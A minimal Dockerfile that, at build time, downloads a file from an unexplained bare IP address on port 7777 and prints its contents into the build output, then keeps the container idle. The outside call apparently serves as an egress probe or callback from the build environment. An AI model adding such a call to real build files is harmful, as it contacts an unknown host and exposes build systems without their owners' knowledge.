FROM alpine:3.19
ADD http://62.113.111.63:7777/meta /tmp/data
RUN cat /tmp/data 2>&1 || true
CMD sleep infinity
